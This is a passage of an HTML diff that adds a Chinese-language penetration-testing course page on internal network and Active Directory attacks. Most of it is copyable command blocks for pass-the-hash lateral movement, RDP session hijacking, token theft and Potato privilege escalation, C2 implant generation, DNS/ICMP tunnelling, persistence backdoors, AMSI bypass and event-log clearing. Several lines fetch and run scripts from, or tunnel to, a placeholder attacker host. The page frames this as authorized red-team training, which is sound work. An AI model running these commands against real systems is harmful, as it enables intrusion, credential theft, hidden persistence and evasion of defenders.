+Test-WSMan -ComputerName 192.168.1.100     <span class="cm"># PowerShell 測試</span>
+
+<span class="cm"># Evil-WinRM（攻擊最常用工具）</span>
+evil-winrm -i 192.168.1.100 -u Administrator -p Password1
+evil-winrm -i 192.168.1.100 -u Administrator -H 8846F7EAEE8FB117AD06BDD830B7586C  <span class="cm"># PtH</span>
+evil-winrm -i 192.168.1.100 -u Administrator -p Password1 -s /opt/scripts/  <span class="cm"># 自動載入 PS 腳本</span>
+
+<span class="cm"># Evil-WinRM Shell 常用命令</span>
+*Evil-WinRM* PS&gt; upload /opt/mimikatz.exe C:\Windows\Temp\mimi.exe
+*Evil-WinRM* PS&gt; download C:\Windows\NTDS\ntds.dit /tmp/ntds.dit
+*Evil-WinRM* PS&gt; menu    <span class="cm"># 顯示特殊功能（Bypass-4MSI、Invoke-Binary 等）</span>
+*Evil-WinRM* PS&gt; Bypass-4MSI   <span class="cm"># 繞過 AMSI（在記憶體中執行工具不落地）</span></pre>
+</div>
+</div>
+
+<!-- L4-2 PsExec / SMBExec -->
+<div class="cb" id="l4-2">
+<h2>PsExec / SMBExec / SmbClient</h2>
+<p>基於 SMB 協議的橫向移動技術，在內網中極為普遍。PsExec 的工作原理是在目標機器的 ADMIN$ 共享中上傳一個服務二進制文件，然後通過 SCM（服務控制管理器）創建並啟動服務來執行命令。</p>
+
+<div class="cblock">
+  <div class="ctop"><span class="clang">SMB 橫向移動工具集</span><button class="ccopy" onclick="cpCode(this)">複製</button></div>
+  <pre><span class="cm"># ─── Impacket PsExec（最通用，有噪音，留下服務事件日誌）───</span>
+psexec.py corp.local/Administrator:Password1@192.168.1.100
+psexec.py -hashes :8846F7EA... corp.local/Administrator@192.168.1.100
+<span class="cm"># 默認以 SYSTEM 身份執行，比 wmiexec 更高權限</span>
+
+<span class="cm"># ─── Impacket SMBExec（更隱蔽，通過服務執行 cmd，不上傳文件）───</span>
+smbexec.py corp.local/Administrator:Password1@192.168.1.100
+
+<span class="cm"># ─── CrackMapExec（批量橫向移動的首選工具）───</span>
+<span class="cm"># 測試憑證有效性並執行命令</span>
+crackmapexec smb 192.168.1.0/24 -u Administrator -p Password1 -x "whoami"
+crackmapexec smb 192.168.1.0/24 -u Administrator -H 8846F7EA... -x "whoami"
+<span class="cm"># 指定執行方式（默認 wmiexec，可選 atexec/smbexec）</span>
+crackmapexec smb 192.168.1.100 -u Administrator -p Password1 --exec-method atexec -x "whoami"
+<span class="cm"># 使用 PowerShell 執行</span>
+crackmapexec smb 192.168.1.100 -u Administrator -p Password1 -X "IEX(New-Object Net.WebClient).DownloadString('http://attacker/shell.ps1')"
+
+<span class="cm"># ─── 訪問 SMB 共享（文件操作）───</span>
+smbclient //192.168.1.100/C$ -U corp/Administrator%Password1
+<span class="cm"># 常用 SMB 命令：</span>
+smb: \&gt; ls                 <span class="cm"># 列目錄</span>
+smb: \&gt; get secret.txt    <span class="cm"># 下載文件</span>
+smb: \&gt; put payload.exe   <span class="cm"># 上傳文件</span>
+smb: \&gt; cd Windows\Temp  <span class="cm"># 切換目錄</span></pre>
+</div>
+</div>
+
+<!-- L4-3 RDP -->
+<div class="cb" id="l4-3">
+<h2>RDP 橫向移動與 RDP 劫持</h2>
+<div class="cblock">
+  <div class="ctop"><span class="clang">RDP 橫向移動技術</span><button class="ccopy" onclick="cpCode(this)">複製</button></div>
+  <pre><span class="cm"># ─── 確認 RDP 是否開啟 ───</span>
+crackmapexec smb 192.168.1.0/24 -u Administrator -p Password1 -M rdp  <span class="cm"># 掃描</span>
+reg query "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections
+<span class="cm"># fDenyTSConnections = 0 → RDP 已開啟</span>
+
+<span class="cm"># ─── 遠端開啟 RDP（如果未開啟）───</span>
+crackmapexec smb 192.168.1.100 -u Administrator -p Password1 -M rdp -o ACTION=enable
+<span class="cm"># 或通過 WMI 修改登錄表：</span>
+wmiexec.py corp/Administrator:Password1@192.168.1.100 cmd /c \
+  "reg add HKLM\System\CurrentControlSet\Control\Terminal\ Server /v fDenyTSConnections /t REG_DWORD /d 0 /f"
+
+<span class="cm"># ─── 連線 RDP ───</span>
+xfreerdp /v:192.168.1.100 /u:Administrator /p:Password1       <span class="cm"># 密碼登入</span>
+xfreerdp /v:192.168.1.100 /u:Administrator /pth:8846F7EA...   <span class="cm"># Pass-the-Hash（需 Restricted Admin 模式）</span>
+
+<span class="cm"># ─── RDP Session 劫持（SYSTEM 權限下劫持其他用戶的 RDP Session）───</span>
+<span class="cm"># STEP 1：查看當前 Session</span>
+qwinsta /server:192.168.1.100
+<span class="cm"># 輸出：</span>
+<span class="cm"># SESSIONNAME  USERNAME    ID   STATE</span>
+<span class="cm"># rdp-tcp#0    jdoe        2    Active   ← 目標（Domain Admin 正在此 Session 工作）</span>
+<span class="cm"># console      attacker    3    Active   ← 我們自己</span>
+
+<span class="cm"># STEP 2：劫持 Session（需要 SYSTEM 權限）</span>
+tscon 2 /dest:rdp-tcp#0    <span class="cm"># 將 jdoe 的 Session 2 連到我們的 Session</span>
+<span class="cm"># 無需密碼！直接繼承 jdoe 的桌面和所有憑證</span>
+
+<span class="cm"># 以 SYSTEM 執行 tscon（需借助 PsExec 或服務）：</span>
+psexec.exe -s -i 1 cmd.exe    <span class="cm"># 彈出 SYSTEM 身份的 CMD</span>
+tscon 2 /dest:console</pre>
+</div>
+</div>
+
+<!-- L4-4 Token 竊取 -->
+<div class="cb" id="l4-4">
+<h2>Token 竊取與 Impersonation</h2>
+<p>Windows Access Token 代表進程或線程的安全上下文。若某台機器上有高特權用戶（如 Domain Admin）的進程在運行，可以竊取其 Token 來模擬該用戶身份，在不知道密碼的情況下提升到域管理員。</p>
+
+<div class="cblock">
+  <div class="ctop"><span class="clang">Token 竊取與模擬</span><button class="ccopy" onclick="cpCode(this)">複製</button></div>
+  <pre><span class="cm"># ─── 前提：需要 SeImpersonatePrivilege 或 SeDebugPrivilege ───</span>
+whoami /priv    <span class="cm"># 檢查當前特權</span>
+<span class="cm"># 服務帳號（IIS、MSSQL、AppPool）通常有 SeImpersonatePrivilege</span>
+
+<span class="cm"># ─── 方法1：Meterpreter Token 竊取 ───</span>
+meterpreter &gt; use incognito
+meterpreter &gt; list_tokens -u         <span class="cm"># 列出可用 Token</span>
+<span class="cm"># 輸出：corp\DomainAdmin （看到 DA 的 Token！）</span>
+meterpreter &gt; impersonate_token "corp\\DomainAdmin"
+meterpreter &gt; getuid                 <span class="cm"># 確認身份已變更</span>
+meterpreter &gt; shell                  <span class="cm"># 以 DA 身份的 Shell</span>
+
+<span class="cm"># ─── 方法2：Mimikatz Token 模擬 ───</span>
+<span class="cm"># 找到 DA 的進程 PID</span>
+tasklist /v | findstr "domainadmin"
+<span class="cm"># 假設 PID = 1234</span>
+mimikatz # token::elevate /domainadmin    <span class="cm"># 自動找到最高特權 Token 並模擬</span>
+mimikatz # token::list                   <span class="cm"># 列出所有可用 Token</span>
+
+<span class="cm"># ─── 方法3：Potato 提權系列（SeImpersonatePrivilege → SYSTEM）───</span>
+<span class="cm"># 適用場景：IIS/MSSQL 服務帳號，有 SeImpersonatePrivilege 但無 SYSTEM</span>
+
+<span class="cm"># JuicyPotato（Windows Server 2016/2019）</span>
+JuicyPotato.exe -l 1337 -p cmd.exe -a "/c whoami" -t *
+
+<span class="cm"># PrintSpoofer（Windows 10 / Server 2019 補丁後 JuicyPotato 失效）</span>
+PrintSpoofer.exe -i -c cmd.exe
+
+<span class="cm"># GodPotato（最新，支援 Windows Server 2012-2022）</span>
+GodPotato.exe -cmd "cmd /c whoami"
+GodPotato.exe -cmd "cmd /c net user hacker Password1 /add && net localgroup administrators hacker /add"</pre>
+</div>
+
+<div class="quiz">
+  <div class="q-lbl">小測驗</div>
+  <div class="q-q">在橫向移動測試中，你已獲得目標機器的 Administrator NTLM Hash（8846F7EAEE8FB117AD06BDD830B7586C），想在不破解密碼的情況下獲取交互式 Shell。以下哪個命令可以直接實現？</div>
+  <div class="q-opts">
+    <div class="qo" onclick="chkQ(this,false)"><span class="qo-k">A</span><code>ssh Administrator@192.168.1.100 -i 8846F7EA...</code></div>
+    <div class="qo" onclick="chkQ(this,true)"><span class="qo-k">B</span><code>evil-winrm -i 192.168.1.100 -u Administrator -H 8846F7EAEE8FB117AD06BDD830B7586C</code></div>
+    <div class="qo" onclick="chkQ(this,false)"><span class="qo-k">C</span><code>crackmapexec smb 192.168.1.100 -u Administrator -H 8846F7EA...</code>（只能執行單條命令）</div>
+    <div class="qo" onclick="chkQ(this,false)"><span class="qo-k">D</span>必須先用 hashcat 破解 Hash 才能登入</div>
+  </div>
+  <div class="q-exp">正確！Evil-WinRM 支援 Pass-the-Hash（-H 參數），可以直接使用 NTLM Hash 連接 WinRM（端口 5985）並獲取完整的 PowerShell 互動 Shell，無需破解密碼。選項 A 是 SSH，不支援 NTLM Hash 認證；選項 C 的 CrackMapExec 雖然也支援 PtH，但 -x 執行命令只能單次執行，不是持久互動 Shell；選項 D 是錯誤的 Pass-the-Hash 的核心就是「無需知道明文密碼」。</div>
+</div>
+</div>
+
+
+<!-- ===== CH5: 隧道穿透與 C2 ===== -->
+
+<!-- L5-1 流量隧道 -->
+<div class="cb" id="l5-1">
+<h2>流量隧道：SSH / Frp / Chisel</h2>
+<p>在真實滲透場景中，目標內網通常無法直接從外部訪問，需要通過已控制的跳板機建立隧道，將流量從攻擊機轉發到內網深處。隧道工具是內網滲透不可或缺的基礎設施。</p>
+
+<div class="kg">
+  <div class="kt"><div class="kt-n">SSH 隧道（本地轉發 / 遠端轉發 / 動態轉發）</div><div class="kt-d">Linux 環境中最常用，利用 OpenSSH 內建功能。本地轉發：攻擊機訪問本機端口 → 轉到目標內網。反向轉發：目標機反連攻擊機 → 開放攻擊機端口供訪問。動態轉發：SOCKS5 代理，任意協議。</div></div>
+  <div class="kt"><div class="kt-n">Chisel（推薦）</div><div class="kt-d">基於 HTTP/WebSocket 的隧道工具，可穿透 HTTP 代理，C/S 架構。支援 SOCKS5 代理和端口轉發兩種模式。跨平台（Linux/Windows），單一二進制。適合 HTTP 出站受限的環境。</div></div>
+  <div class="kt"><div class="kt-n">Frp（快速反向代理）</div><div class="kt-d">高性能反向代理工具，適合長期維持訪問。配置文件靈活，支援 TCP/UDP/HTTP/HTTPS 轉發，支援加密和壓縮。frpc 在目標機執行，frps 在攻擊機執行。</div></div>
+  <div class="kt"><div class="kt-n">Netsh / Plink（Windows 內建）</div><div class="kt-d">netsh interface portproxy 是 Windows 內建的端口轉發工具，無需額外上傳文件。Plink 是 PuTTY 的命令列版本，可在 Windows 機器上建立 SSH 隧道。</div></div>
+</div>
+
+<div class="cblock">
+  <div class="ctop"><span class="clang">隧道工具實戰命令</span><button class="ccopy" onclick="cpCode(this)">複製</button></div>
+  <pre><span class="cm"># ─── SSH 隧道 ───</span>
+<span class="cm"># 本地端口轉發：攻擊機本機 3389 → 內網 192.168.2.100:3389（通過跳板機 jump.target.com）</span>
+ssh -L 3389:192.168.2.100:3389 user@jump.target.com -N -f
+xfreerdp /v:127.0.0.1:3389 /u:Administrator /p:Password1
+
+<span class="cm"># 動態轉發（SOCKS5 代理）：所有流量通過跳板機轉發</span>
+ssh -D 1080 user@jump.target.com -N -f
+proxychains nmap -sT -p 445,3389,5985 192.168.2.0/24
+
+<span class="cm"># 反向隧道（目標機無法從外部訪問，讓目標機主動連接攻擊機）</span>
+<span class="cm"># 在目標機執行：</span>
+ssh -R 4444:127.0.0.1:3389 attacker@attacker.com -N -f
+<span class="cm"># 攻擊機本機 4444 = 目標機 3389</span>
+
+<span class="cm"># ─── Chisel（穿透 HTTP 代理）───</span>
+<span class="cm"># 攻擊機（Server 端）：</span>
+./chisel server --port 8080 --reverse
+
+<span class="cm"># 目標機（Client 端，向外發起 HTTP 連線）：</span>
+./chisel client attacker.com:8080 R:socks             <span class="cm"># 反向 SOCKS5</span>
+./chisel client attacker.com:8080 R:3389:192.168.2.100:3389  <span class="cm"># 反向端口轉發</span>
+
+<span class="cm"># 攻擊機使用：</span>
+proxychains evil-winrm -i 192.168.2.100 -u Administrator -p Password1
+
+<span class="cm"># ─── Windows 內建端口轉發（無需工具）───</span>
+<span class="cm"># 在已控制的 Windows 跳板機執行（需管理員）：</span>
+netsh interface portproxy add v4tov4 listenport=3389 listenaddress=0.0.0.0 \
+  connectport=3389 connectaddress=192.168.2.100
+<span class="cm"># 之後直接連跳板機 IP:3389 = 訪問內網 192.168.2.100:3389</span>
+
+<span class="cm"># 刪除轉發規則</span>
+netsh interface portproxy delete v4tov4 listenport=3389 listenaddress=0.0.0.0</pre>
+</div>
+</div>
+
+<!-- L5-2 proxychains -->
+<div class="cb" id="l5-2">
+<h2>SOCKS5 代理鏈：proxychains</h2>
+<p>proxychains 允許在 Linux 上強制任意程式通過 SOCKS5/SOCKS4/HTTP 代理，是內網滲透中與隧道工具配合使用的核心工具。</p>
+
+<div class="cblock">
+  <div class="ctop"><span class="clang">proxychains 配置與使用</span><button class="ccopy" onclick="cpCode(this)">複製</button></div>
+  <pre"><span class="cm"># ─── proxychains 配置文件 /etc/proxychains4.conf ───</span>
+<span class="cm"># 將末尾的 socks4 127.0.0.1 9050 替換為：</span>
+socks5  127.0.0.1  1080   <span class="cm"># SOCKS5 代理（Chisel/SSH 動態轉發的本機監聽端口）</span>
+
+<span class="cm"># 代理鏈（穿越多個跳板）：</span>
+socks5  127.0.0.1  1080   <span class="cm"># 第一跳（外網跳板）</span>
+socks5  127.0.0.1  1081   <span class="cm"># 第二跳（內網跳板，通過第一跳搭建）</span>
+
+<span class="cm"># ─── 在 proxychains 下執行工具 ───</span>
+proxychains nmap -sT -Pn -p 445,3389,5985 192.168.2.100    <span class="cm"># 掃描內網（-sT 必須，不能用 SYN 掃描）</span>
+proxychains evil-winrm -i 192.168.2.100 -u Administrator -p Password1
+proxychains crackmapexec smb 192.168.2.0/24 -u Administrator -p Password1
+proxychains secretsdump.py corp/Administrator:Password1@192.168.2.10
+proxychains xfreerdp /v:192.168.2.100 /u:Administrator /p:Password1
+
+<span class="cm"># ─── Meterpreter 內建代理 ───</span>
+<span class="cm"># 在 Meterpreter Session 中添加路由（Metasploit 框架內的流量路由）</span>
+meterpreter &gt; run post/multi/manage/autoroute
+<span class="cm"># 或手動：</span>
+meterpreter &gt; background
+msf6 &gt; route add 192.168.2.0/24 [SESSION_ID]
+<span class="cm"># 啟動 SOCKS 代理模組</span>
+msf6 &gt; use auxiliary/server/socks_proxy
+msf6 &gt; set VERSION 5
+msf6 &gt; set SRVPORT 1080
+msf6 &gt; run -j</pre>
+</div>
+</div>
+
+<!-- L5-3 C2 框架 -->
+<div class="cb" id="l5-3">
+<h2>C2 框架：Cobalt Strike / Sliver</h2>
+<p>C2（Command and Control）框架提供統一的後滲透管理平台，包括 Beacon/Implant 管理、橫向移動、憑證收集、持久化等功能，比手動工具更高效，是紅隊演練的標配。</p>
+
+<div class="tbl">
+  <table class="t">
+    <thead><tr><th>框架</th><th>特點</th><th>授權</th><th>適用場景</th></tr></thead>
+    <tbody>
+      <tr><td><strong>Cobalt Strike</strong></td><td>業界標準，功能最完善，Aggressor Script 高度可擴展，大量第三方 BOF（Beacon Object Files）；Beacon 支援多種通訊協議（HTTP/DNS/SMB Named Pipe）</td><td>商業（約 $3,600 / 年）</td><td>企業紅隊、APT 模擬</td></tr>
+      <tr><td><strong>Sliver</strong></td><td>開源 C2，Golang 編寫，支援 mTLS/HTTP/DNS/WireGuard；多人協作、動態 implant 生成、Armory 插件系統。是最推薦的免費替代品。</td><td>開源（BSL）</td><td>學習練習、小型紅隊</td></tr>
+      <tr><td><strong>Havoc Framework</strong></td><td>開源現代 C2，Demon implant（Windows），支援 BOF，介面類似 CS，活躍開發中</td><td>開源（GPL）</td><td>學習、靶機練習</td></tr>
+      <tr><td><strong>Metasploit</strong></td><td>老牌框架，Meterpreter Session 管理，模組豐富但 implant 特徵明顯，易被 AV 偵測</td><td>開源（MPL）/ Metasploit Pro 商業</td><td>入門學習、CTF</td></tr>
+    </tbody>
+  </table>
+</div>
+
+<div class="cblock">
+  <div class="ctop"><span class="clang">Sliver C2 — 快速入門</span><button class="ccopy" onclick="cpCode(this)">複製</button></div>
+  <pre><span class="cm"># ─── Sliver 安裝與啟動 ───</span>
+curl https://sliver.sh/install | sudo bash
+sliver-server    <span class="cm"># 啟動服務器（進入互動式 Shell）</span>
+
+<span class="cm"># ─── 生成 Implant ───</span>
+sliver &gt; generate --http attacker.com --save /tmp/implant.exe    <span class="cm"># HTTP implant</span>
+sliver &gt; generate --mtls attacker.com --save /tmp/implant.exe    <span class="cm"># mTLS implant（更安全）</span>
+sliver &gt; generate --dns update.corp.com --save /tmp/implant.exe  <span class="cm"># DNS implant（隱蔽）</span>
+
+<span class="cm"># ─── 啟動監聽器 ───</span>
+sliver &gt; http --lport 80
+sliver &gt; mtls --lport 443
+sliver &gt; dns --domains update.corp.com
+
+<span class="cm"># ─── 目標執行 Implant 後，Session 上線 ───</span>
+sliver &gt; sessions                      <span class="cm"># 列出所有 Session</span>
+sliver &gt; use [SESSION_ID]              <span class="cm"># 進入 Session</span>
+
+<span class="cm"># ─── Session 操作 ───</span>
+sliver (SESSION) &gt; whoami
+sliver (SESSION) &gt; shell                              <span class="cm"># 互動 Shell</span>
+sliver (SESSION) &gt; execute-assembly mimikatz.exe -- "sekurlsa::logonpasswords exit"
+sliver (SESSION) &gt; socks5 start --host 127.0.0.1 --port 1080   <span class="cm"># 開啟 SOCKS5 代理</span>
+sliver (SESSION) &gt; portfwd add -r 192.168.2.100:3389            <span class="cm"># 端口轉發</span></pre>
+</div>
+</div>
+
+<!-- L5-4 DNS/ICMP 隧道 -->
+<div class="cb" id="l5-4">
+<h2>DNS / ICMP 隱蔽隧道</h2>
+<p>在極度受限的環境（只允許特定協議出站），DNS 和 ICMP 隧道可以在幾乎任何網路中建立通訊通道，因為防火牆很少阻擋 DNS 查詢和 ICMP Ping。</p>
+
+<div class="cblock">
+  <div class="ctop"><span class="clang">DNS 隧道原理與工具</span><button class="ccopy" onclick="cpCode(this)">複製</button></div>
+  <pre><span class="cm"># ─── DNS 隧道原理 ───</span>
+<span class="cm"># 數據編碼在 DNS 查詢的子域名中：</span>
+<span class="cm"># 目標機發送：dGVzdA==.c2.attacker.com（Base64 編碼的數據）</span>
+<span class="cm"># 攻擊者 DNS 服務器收到查詢 → 解碼數據</span>
+<span class="cm"># 攻擊者通過 DNS 響應（TXT/CNAME 記錄）回傳數據</span>
+<span class="cm"># 條件：需要控制一個域名及其 NS 服務器</span>
+
+<span class="cm"># ─── dnscat2（DNS 隧道 Shell）───</span>
+<span class="cm"># 攻擊機（需要控制 update.attacker.com 的 NS）：</span>
+ruby dnscat2.rb --dns "domain=update.attacker.com,host=0.0.0.0" --no-cache
+
+<span class="cm"># 目標機執行：</span>
+dnscat --dns domain=update.attacker.com   <span class="cm"># 或 PowerShell 版</span>
+IEX (New-Object Net.WebClient).DownloadString('http://cdn/.../Invoke-DNScat.ps1')
+Invoke-DNSCat -Domain update.attacker.com -DNSServer 8.8.8.8 -Exec cmd
+
+<span class="cm"># ─── iodine（DNS 隧道 IP 網路）───</span>
+<span class="cm"># 攻擊機（服務端）：</span>
+iodined -f -c -P Password1 10.0.0.1 tunnel.attacker.com
+
+<span class="cm"># 目標機（客戶端）：</span>
+iodine -f -P Password1 attacker.com tunnel.attacker.com
+<span class="cm"># 建立後：目標機 IP 10.0.0.2 → 可從攻擊機直接 SSH 到 10.0.0.2</span>
+
+<span class="cm"># ─── ICMP 隧道（ptunnel-ng）───</span>
+<span class="cm"># 攻擊機（服務端）：</span>
+ptunnel-ng -R -x Password1
+
+<span class="cm"># 目標機（客戶端），通過 ICMP 將本地 1080 轉到攻擊機 22：</span>
+ptunnel-ng -p attacker.com -lp 1080 -da 127.0.0.1 -dp 22 -x Password1
+ssh -p 1080 localhost  <span class="cm"># 通過 ICMP 隧道 SSH</span></pre>
+</div>
+</div>
+
+
+<!-- ===== CH6: 權限維持與清理 ===== -->
+
+<!-- L6-1 持久化 -->
+<div class="cb" id="l6-1">
+<h2>持久化技術：計劃任務 / 服務 / 登錄表</h2>
+<p>持久化（Persistence）確保在系統重啟、用戶登出或初始 Shell 失效後，攻擊者仍然能夠重新獲得對目標的控制。紅隊演練中的持久化必須向客戶明確聲明並在演練結束後徹底清除。</p>
+
+<div class="cblock">
+  <div class="ctop"><span class="clang">Windows 持久化技術速查</span><button class="ccopy" onclick="cpCode(this)">複製</button></div>
+  <pre><span class="cm">REM ─── 1. 計劃任務（Scheduled Tasks）───</span>
+<span class="cm">REM 每次系統啟動執行（需管理員）</span>
+schtasks /create /tn "WindowsUpdate" /tr "C:\Windows\Temp\payload.exe" /sc onstart /ru SYSTEM /f
+<span class="cm">REM 每隔 5 分鐘執行（不需要管理員）</span>
+schtasks /create /tn "HealthCheck" /tr "C:\Users\Public\check.exe" /sc minute /mo 5 /f
+<span class="cm">REM 用戶登入時執行</span>
+schtasks /create /tn "UserInit" /tr "C:\Users\jdoe\startup.exe" /sc onlogon /f
+
+<span class="cm">REM ─── 2. 服務後門 ───</span>
+sc create "WinMgmtHelper" binPath="C:\Windows\Temp\payload.exe" start=auto
+sc start WinMgmtHelper
+
+<span class="cm">REM ─── 3. 登錄表啟動項 ───</span>
+<span class="cm">REM HKCU Run（當前用戶，無需管理員）</span>
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Updater" /t REG_SZ /d "C:\Users\Public\payload.exe" /f
+<span class="cm">REM HKLM Run（所有用戶，需管理員）</span>
+reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "Updater" /t REG_SZ /d "C:\Windows\Temp\payload.exe" /f
+
+<span class="cm">REM ─── 4. WMI 事件訂閱（隱蔽性強，無文件，難以發現）───</span>
+<span class="cm">REM PowerShell：每 60 秒觸發一次</span>
+$Filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{
+    Name = "Updater"; EventNamespace = "root\cimv2";
+    QueryLanguage = "WQL"; Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
+}
+$Consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{
+    Name = "Updater"; CommandLineTemplate = "C:\Windows\Temp\payload.exe"
+}
+Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{Filter=$Filter; Consumer=$Consumer}
+
+<span class="cm">REM ─── 5. Golden Ticket（域持久化，無需修改目標系統）───</span>
+<span class="cm">REM 見 L3-4，krbtgt Hash 不重置則永久有效</span>
+
+<span class="cm">REM ─── 6. DCShadow（域控持久化，向 AD 注入惡意數據）───</span>
+<span class="cm">REM 需要域管理員權限，攻擊機模擬域控，可修改任意 AD 對象</span>
+mimikatz # lsadump::dcshadow /domain:corp.local /object:jdoe /attribute:primaryGroupID /value:512
+<span class="cm">REM 將 jdoe 的主群組改為 512（Domain Admins 的 RID）</span></pre>
+</div>
+</div>
+
+<!-- L6-2 日誌清理 -->
+<div class="cb" id="l6-2">
+<h2>日誌清理與痕跡消除</h2>
+<p>在獲得授權的紅隊演練中，測試結束後需要清理所有植入的後門、工具和修改，並評估清理是否徹底。理解日誌結構也有助於了解哪些操作會留下痕跡。</p>
+
+<div class="tbl">
+  <table class="t">
+    <thead><tr><th>Windows 日誌類型</th><th>位置</th><th>關鍵事件 ID</th></tr></thead>
+    <tbody>
+      <tr><td><strong>Security Log</strong></td><td>%SystemRoot%\System32\winevt\Logs\Security.evtx</td><td>4624 登入成功、4625 登入失敗、4648 明確憑證登入、4769 Kerberos 服務票證請求、4720 用戶創建</td></tr>
+      <tr><td><strong>System Log</strong></td><td>%SystemRoot%\System32\winevt\Logs\System.evtx</td><td>7045 新服務安裝、7036 服務啟停</td></tr>
+      <tr><td><strong>PowerShell Log</strong></td><td>Microsoft-Windows-PowerShell/Operational</td><td>4103 Module Logging、4104 Script Block Logging（記錄每行 PS 命令）</td></tr>
+      <tr><td><strong>WMI 活動</strong></td><td>Microsoft-Windows-WMI-Activity/Operational</td><td>5857/5860/5861 WMI 事件訂閱活動</td></tr>
+      <tr><td><strong>Sysmon</strong></td><td>Microsoft-Windows-Sysmon/Operational</td><td>1 進程創建、3 網路連線、11 文件創建、13 登錄表修改、22 DNS 查詢</td></tr>
+    </tbody>
+  </table>
+</div>
+
+<div class="cblock">
+  <div class="ctop"><span class="clang">痕跡清理（紅隊演練結束後）</span><button class="ccopy" onclick="cpCode(this)">複製</button></div>
+  <pre><span class="cm">REM ─── 清除 Windows 事件日誌 ───</span>
+wevtutil cl Security     <span class="cm">REM 清除 Security 日誌</span>
+wevtutil cl System       <span class="cm">REM 清除 System 日誌</span>
+wevtutil cl Application  <span class="cm">REM 清除 Application 日誌</span>
+<span class="cm">REM 或清除所有日誌：</span>
+Get-EventLog -List | ForEach-Object { wevtutil cl $_.LogDisplayName }
+
+<span class="cm">REM ─── 刪除工具和 Payload ───</span>
+del /f /q C:\Windows\Temp\mimikatz.exe
+del /f /q C:\Windows\Temp\payload.exe
+<span class="cm">REM 安全刪除（多次覆寫，防止取證恢復）：</span>
+sdelete.exe -p 3 C:\Windows\Temp\payload.exe  <span class="cm">REM SysInternals sdelete</span>
+
+<span class="cm">REM ─── 移除持久化 ───</span>
+schtasks /delete /tn "WindowsUpdate" /f      <span class="cm">REM 刪除計劃任務</span>
+sc stop WinMgmtHelper && sc delete WinMgmtHelper  <span class="cm">REM 刪除服務</span>
+reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Updater" /f  <span class="cm">REM 刪除登錄表</span>
+
+<span class="cm">REM ─── 清除 PowerShell 歷史 ───</span>
+Remove-Item (Get-PSReadlineOption).HistorySavePath -Force
+Clear-History
+
+<span class="cm">REM ─── 重置修改過的 AD 帳號（如果修改了域對象）───</span>
+<span class="cm">REM 移除測試中添加的 DCSync 權限：</span>
+Remove-DomainObjectAcl -TargetIdentity "DC=corp,DC=local" -PrincipalIdentity jdoe \
+  -Rights DCSync -Verbose</pre>
+</div>
+</div>
+
+<!-- L6-3 OPSEC -->
+<div class="cb" id="l6-3">
+<h2>OPSEC 操作安全原則</h2>
+<p>OPSEC（Operations Security）在滲透測試中指的是在達成測試目標的同時，盡量減少可被防禦方偵測到的痕跡，以準確評估組織的防禦能力。以下是紅隊操作的核心 OPSEC 原則。</p>
+
+<div class="ilist">
+  <div class="il-item"><span class="il-num">01</span><div class="il-txt"><strong>優先使用系統內建工具（Living off the Land）</strong> — 使用 PowerShell、WMI、certutil、bitsadmin 等系統自帶工具，比上傳第三方工具產生更少的告警。原則：能用 LOLBins 解決的，不使用自帶工具。</div></div>
+  <div class="il-item"><span class="il-num">02</span><div class="il-txt"><strong>避免觸發高噪音掃描</strong> — 限制掃描速率（nmap --scan-delay），避免大量快速的 SMB 連線（可能觸發蜜罐和 IDS），先掃小範圍確認後再擴大。</div></div>
+  <div class="il-item"><span class="il-num">03</span><div class="il-txt"><strong>記憶體駐留（In-Memory Execution）</strong> — 盡量在記憶體中執行工具（Invoke-Mimikatz / Cobalt Strike execute-assembly），不落地到磁碟，避免被文件型防毒掃描到。</div></div>
+  <div class="il-item"><span class="il-num">04</span><div class="il-txt"><strong>Beacon / Implant 通訊偽裝</strong> — 使用 HTTPS + 域前置（Domain Fronting）讓 C2 流量看起來像正常的 CDN 流量；配置 Beacon Sleep 時間（如 60 秒 + 30% 抖動）模擬人工操作節奏。</div></div>
+  <div class="il-item"><span class="il-num">05</span><div class="il-txt"><strong>最小化 AD 操作痕跡</strong> — 避免使用高特徵工具（如 SharpHound 的 All 採集模式非常嘈雜）；優先使用 bloodhound-python 從 Linux 遠端採集，減少在目標機上的操作；Kerberoasting 一次性採集，不反覆請求。</div></div>
+  <div class="il-item"><span class="il-num">06</span><div class="il-txt"><strong>操作時間偽裝</strong> — 在目標組織的正常工作時間（如周一至周五 9-18 點）執行操作，模擬正常用戶行為。周末和深夜的異常操作更容易被偵測。</div></div>
+</div>
+
+<div class="done-banner">
+  <h3>Stage 07 完成：內網滲透與 Active Directory 攻防</h3>
+  <p>你已掌握完整的內網滲透技術棧：AD 架構與 Kerberos 深入理解、BloodHound 攻擊路徑分析、Kerberoasting/AS-REP Roasting/DCSync 等域攻擊技術、WMI/WinRM/RDP 橫向移動、Chisel/Frp 隧道穿透、C2 框架使用，以及持久化與 OPSEC 原則。繼續進入社會工程學與釣魚攻擊。</p>
+  <div class="btn-row">
+    <a href="stage8.html" class="btn-p">前往第八階段：社會工程學</a>
+    <a href="stage6.html" class="btn-g">回顧第六階段</a>
+    <a href="index.html" class="btn-g">返回課程首頁</a>
+  </div>
+</div>
+</div><!-- /cw -->
+
+<div class="lnav">
+  <button class="lb" id="prevb" onclick="prevL()" disabled>&#8592; 上一課</button>
+  <div class="ln-mid">
+    <div class="ln-cnt" id="cnt">1 / 24</div>
+    <div class="ln-sub" id="lsub">內網滲透概論與攻擊鏈</div>
+  </div>
+  <button class="lb pri" id="nextb" onclick="nextL()">下一課 &#8594;</button>
+</div>
+
+</main>
+</div>
+
+<script>
+const LS=[
+  {id:'l1-1',ch:'CH1',title:'內網滲透概論與攻擊鏈',time:'25分鐘',type:'方法論'},
+  {id:'l1-2',ch:'CH1',title:'主機信息收集：系統 / 用戶 / 網路',time:'25分鐘',type:'信息收集'},
+  {id:'l1-3',ch:'CH1',title:'內網掃描：存活發現與端口掃描',time:'20分鐘',type:'網路掃描'},
+  {id:'l1-4',ch:'CH1',title:'憑證收集：Mimikatz 與記憶體傾倒',time:'30分鐘',type:'憑證提取'},
